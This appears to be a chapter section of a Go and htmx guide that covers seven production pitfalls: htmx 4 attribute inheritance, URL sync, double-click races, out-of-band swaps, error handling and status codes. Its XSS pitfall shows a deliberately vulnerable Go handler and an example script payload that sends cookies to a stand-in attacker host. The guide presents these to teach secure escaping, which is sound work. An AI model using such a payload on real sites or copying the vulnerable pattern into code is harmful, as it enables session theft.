## 53C.7 Production Pitfalls and Operational Failure Modes

Hypermedia simplifies system architecture, but it introduces distinct operational failure modes. This section analyzes the seven most common pitfalls encountered in production Go and htmx deployments.

---

### Pitfall 1: Unintended State Leakage from Missing `:inherited` in htmx 4

In htmx 1 and 2, attributes placed on parent containers implicitly cascaded down to all child elements. In htmx 4, attribute inheritance is explicit and requires the `:inherited` suffix.

#### The Failure Scenario

A development team upgrades an administrative console from htmx 2 to htmx 4. They have a toolbar container configured with a target panel:

```html
<!-- Broken in htmx 4: buttons do not inherit the target -->
<div class="toolbar" hx-target="#detail-panel">
  <button hx-get="/user/1/profile">Profile</button>
  <button hx-get="/user/1/permissions">Permissions</button>
  <button hx-get="/user/1/audit-log">Audit Log</button>
</div>

<div id="detail-panel"></div>
```

In htmx 2, clicking any button swapped content into `#detail-panel`. In htmx 4, because `:inherited` is missing, the target default resets to the button itself (`this`). Clicking the button swaps the entire user profile HTML fragment directly inside the tiny `<button>` element, destroying the navigation layout.

#### The Production Fix

Explicitly designate inherited attributes with `:inherited`:

```html
<!-- Correct htmx 4 syntax -->
<div class="toolbar" hx-target:inherited="#detail-panel">
  <button hx-get="/user/1/profile">Profile</button>
  <button hx-get="/user/1/permissions">Permissions</button>
  <button hx-get="/user/1/audit-log">Audit Log</button>
</div>
```

During team migrations, run the official compatibility scanner before deploying:

```bash
npx htmx.org@4.0.0 upgrade-check ./templates
```

---

### Pitfall 2: Swapping Unescaped HTML (Cross-Site Scripting XSS)

Because htmx injects server responses directly into the browser DOM, any unescaped user input returned in an HTML fragment becomes an immediate Cross-Site Scripting (XSS) vulnerability.

#### The Vulnerable Code

A developer bypasses Go's automatic template escaping by casting user input to `template.HTML`:

```go
// Dangerous security anti-pattern in Go
func (s *Server) handleComment(w http.ResponseWriter, r *http.Request) {
    comment := r.PostFormValue("body")
    
    // Bypassing template escaping allows raw script execution
    trustedHTML := template.HTML(fmt.Sprintf(`<div class="comment">%s</div>`, comment))
    s.templates.ExecuteTemplate(w, "comment_bubble", trustedHTML)
}
```

If an attacker submits `<script>fetch('https://evil.corp/steal?cookie='+document.cookie)</script>`, htmx receives the payload and injects it into the DOM, executing the script in the victim's session context.

#### The Production Fix

Never use `template.HTML` with untrusted data. Rely on Go's contextual auto-escaping in `html/template`, or use `template.HTMLEscapeString`:

```go
// Secure: Go contextual escaping sanitizes all input
type CommentView struct {
    Author string
    Body   string
}

func (s *Server) handleComment(w http.ResponseWriter, r *http.Request) {
    view := CommentView{
        Author: r.PostFormValue("author"),
        Body:   r.PostFormValue("body"),
    }
    // html/template automatically neutralizes HTML tags and attributes
    s.templates.ExecuteTemplate(w, "comment_bubble.html", view)
}
```

---

### Pitfall 3: Browser Back-Button Breakage and URL Desynchronization

When users filter tables, switch tabs, or search records using htmx, they expect browser history to work. If an application updates the DOM without synchronizing the browser URL, refreshing the page or clicking "Back" discards the user's active context.

#### The Failure Scenario

A user types a search query, filters a transaction table down to one specific customer, and sends the browser URL to a colleague. Because the filter request did not update the URL bar, the colleague opens the default dashboard showing all transactions.

#### The Production Fix

Synchronize URL state on filter actions using `hx-push-url="true"` or the server-side `HX-Push-Url` header:

```html
<!-- Pushes query parameters to browser address bar -->
<input type="text" 
       name="q" 
       hx-get="/transactions" 
       hx-trigger="keyup changed delay:300ms"
       hx-target="#transaction-list"
       hx-push-url="true">
```

Ensure your Go handlers support both modes: rendering the fragment when `HX-Request: true` is present, and rendering the full page when a user opens the bookmarked URL directly.

---

### Pitfall 4: Rapid Click Race Conditions

When network latency fluctuates, users frequently double-click or spam action buttons. Without client concurrency guards, the browser fires multiple concurrent requests for the same mutation.

```
Click 1 -> POST /orders/charge (in flight...)
Click 2 -> POST /orders/charge (in flight...)
Server processes both requests concurrently -> Duplicate charge created
```

#### The Production Fix in htmx 4

In htmx 4, `hx-disable` automatically disables the triggering element while the request is in flight:

```html
<!-- Button is disabled automatically until response returns -->
<button hx-post="/orders/checkout" 
        hx-target="#checkout-status"
        hx-disable>
  Submit Order
</button>
```

On the backend, always enforce idempotent mutations using distributed database locks or unique idempotency keys.

---

### Pitfall 5: The Fragile Out-of-Band (OOB) Trap

In htmx 1 and 2, updating multiple DOM locations required sprinkling `hx-swap-oob="true"` throughout partial templates.

#### The Maintenance Hazard

An endpoint designed to update a user's notification list also returns an OOB snippet targeting `#global-unread-badge`:

```html
<!-- Broken coupling: endpoint knows about unrelated navbar layout -->
<div id="notifications">
  <div class="item">New message received</div>
</div>

<div id="global-unread-badge" hx-swap-oob="true">
  <span>3</span>
</div>
```

If another engineer renames the navbar element from `#global-unread-badge` to `#header-notification-count`, the OOB swap silently fails with no console warning.

#### The htmx 4 Resolution

Use htmx 4's native `<hx-partial>` tags for explicit multi-target payloads, or decouple components entirely using event-driven `HX-Trigger` headers:

```go
// Clean decoupling: Tell the browser what happened, let components update themselves
w.Header().Set("HX-Trigger", "notificationCountChanged")
```

```html
<!-- Component listens for event and owns its own data fetching -->
<span id="unread-badge" 
      hx-get="/api/notifications/count" 
      hx-trigger="notificationCountChanged from:body">
  3
</span>
```

---

### Pitfall 6: Raw JSON Spilled into User Interfaces

If a Go microservice returns an unexpected JSON error response (for example, from a reverse proxy or unhandled panic handler), htmx treats the response body as HTML and injects the raw JSON text directly into the page.

```
UI Displays: {"code":500,"error":"pgx: connection pool exhausted"}
```

#### The Production Fix

Implement a Go recovery middleware that inspects the `HX-Request` header and renders a styled HTML error fragment rather than a JSON dictionary:

```go
func HTMXRecoveryMiddleware(templates *template.Template) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            defer func() {
                if rec := recover(); rec != nil {
                    log.Printf("Unhandled panic: %v", rec)
                    w.Header().Set("Content-Type", "text/html; charset=utf-8")
                    w.WriteHeader(http.StatusInternalServerError)

                    if r.Header.Get("HX-Request") == "true" {
                        templates.ExecuteTemplate(w, "error_fragment.html", map[string]string{
                            "Message": "An internal system error occurred. Operations team notified.",
                        })
                        return
                    }
                    templates.ExecuteTemplate(w, "error_500_full.html", nil)
                }
            }()
            next.ServeHTTP(w, r)
        })
    }
}
```

---

### Pitfall 7: Returning HTTP 200 for Form Validation Errors

A widespread anti-pattern in early htmx applications was returning HTTP 200 OK when form validation failed, simply to force htmx 1 or 2 to swap the error template.

Returning HTTP 200 for an invalid form violates HTTP semantics:
* Caching proxies cache the error page as a valid response.
* Automated testing suites cannot distinguish successful submissions from rejected inputs.
* Web analytics and error monitoring tools miss user friction events.

#### The htmx 4 Resolution

Always return **HTTP 422 Unprocessable Entity** for validation errors. htmx 4 swaps 4xx responses into the target element by default, preserving semantic correctness and updating the UI in place.
